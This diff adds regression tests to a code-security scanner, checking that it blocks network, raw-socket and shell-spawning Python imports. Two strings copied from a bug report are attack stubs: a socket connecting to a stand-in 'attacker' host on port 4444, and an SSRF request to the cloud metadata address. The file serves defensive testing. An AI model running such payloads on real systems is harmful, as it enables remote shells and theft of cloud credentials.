@@ -305,3 +305,134 @@ class TestScanCodeSecurityExfiltrationAndEscapes:
         # getattr is common/legit — banning it would regress real components.
         result = scan_code_security('v = getattr(self, "field", None)')
         assert result.is_safe is True
+
+
+class TestScanCodeSecurityNetworkImports:
+    """Regression for CVE-2026-33873 incomplete fix (H1-3773010).
+
+    Raw-socket / non-HTTP-protocol / shell-spawning stdlib modules enable the
+    same attack class as ``subprocess`` (reverse shells, SSRF, raw exfil) and
+    must be blocked. High-level HTTP via ``requests`` stays allowed by design
+    (legit API components need it), as do the safe ``urllib.parse`` /
+    ``http.HTTPStatus`` siblings.
+    """
+
+    def test_should_detect_socket_import(self):
+        """Import socket — raw-socket reverse shell / exfil primitive."""
+        result = scan_code_security("import socket")
+        assert result.is_safe is False
+        assert any("socket" in v for v in result.violations)
+
+    def test_should_detect_from_socket_import(self):
+        result = scan_code_security("from socket import socket")
+        assert result.is_safe is False
+
+    def test_should_detect_socketserver_import(self):
+        result = scan_code_security("import socketserver")
+        assert result.is_safe is False
+
+    def test_should_detect_urllib_request_import(self):
+        """Import urllib.request — SSRF + file:// local read bypass."""
+        result = scan_code_security("import urllib.request")
+        assert result.is_safe is False
+        assert any("urllib.request" in v for v in result.violations)
+
+    def test_should_detect_from_urllib_request_import(self):
+        result = scan_code_security("from urllib.request import urlopen")
+        assert result.is_safe is False
+
+    def test_should_detect_from_urllib_import_request_submodule(self):
+        """`from urllib import request` must also be caught."""
+        result = scan_code_security("from urllib import request")
+        assert result.is_safe is False
+
+    def test_should_detect_urllib_error_import(self):
+        result = scan_code_security("import urllib.error")
+        assert result.is_safe is False
+
+    def test_should_detect_http_client_import(self):
+        result = scan_code_security("import http.client")
+        assert result.is_safe is False
+
+    def test_should_detect_from_http_client_import(self):
+        result = scan_code_security("from http.client import HTTPConnection")
+        assert result.is_safe is False
+
+    def test_should_detect_from_http_import_client_submodule(self):
+        result = scan_code_security("from http import client")
+        assert result.is_safe is False
+
+    def test_should_detect_ftplib_import(self):
+        result = scan_code_security("import ftplib")
+        assert result.is_safe is False
+
+    def test_should_detect_smtplib_import(self):
+        result = scan_code_security("import smtplib")
+        assert result.is_safe is False
+
+    def test_should_detect_telnetlib_import(self):
+        result = scan_code_security("import telnetlib")
+        assert result.is_safe is False
+
+    def test_should_detect_poplib_import(self):
+        result = scan_code_security("import poplib")
+        assert result.is_safe is False
+
+    def test_should_detect_imaplib_import(self):
+        result = scan_code_security("import imaplib")
+        assert result.is_safe is False
+
+    def test_should_detect_xmlrpc_import(self):
+        result = scan_code_security("from xmlrpc import client")
+        assert result.is_safe is False
+
+    def test_should_detect_pty_import(self):
+        """Import pty — interactive reverse-shell spawning (Scenario D)."""
+        result = scan_code_security("import pty")
+        assert result.is_safe is False
+
+    def test_should_detect_os_dup2_call(self):
+        """os.dup2() — fd redirection used to wire a socket to a shell."""
+        result = scan_code_security("import os\nos.dup2(3, 0)")
+        assert result.is_safe is False
+        assert any("dup2" in v for v in result.violations)
+
+    def test_should_detect_from_os_import_dup2(self):
+        result = scan_code_security("from os import dup2")
+        assert result.is_safe is False
+
+    # --- reporter PoC payloads (H1-3773010) ---
+
+    def test_should_block_reporter_socket_reverse_shell_poc(self):
+        code = "import socket\ns = socket.socket()\ns.connect(('attacker', 4444))"
+        result = scan_code_security(code)
+        assert result.is_safe is False
+
+    def test_should_block_reporter_urllib_ssrf_poc(self):
+        code = "import urllib.request\nurllib.request.urlopen('http://169.254.169.254/latest/meta-data/')"
+        result = scan_code_security(code)
+        assert result.is_safe is False
+
+    # --- no-regression: HTTP + safe siblings must still pass ---
+
+    def test_should_still_allow_requests(self):
+        result = scan_code_security('import requests\nr = requests.get("https://api.example.com")')
+        assert result.is_safe is True
+
+    def test_should_allow_urllib_parse(self):
+        """urllib.parse (urlencode/quote) is a common, safe API helper."""
+        result = scan_code_security("from urllib.parse import urlencode\nq = urlencode({'a': 1})")
+        assert result.is_safe is True
+
+    def test_should_allow_urllib_parse_module_import(self):
+        result = scan_code_security("import urllib.parse")
+        assert result.is_safe is True
+
+    def test_should_allow_http_httpstatus(self):
+        """From http import HTTPStatus is legitimate and must not be flagged."""
+        result = scan_code_security("from http import HTTPStatus\ns = HTTPStatus.OK")
+        assert result.is_safe is True
+
+    def test_should_allow_bare_http_import(self):
+        result = scan_code_security("import http")
+        assert result.is_safe is True
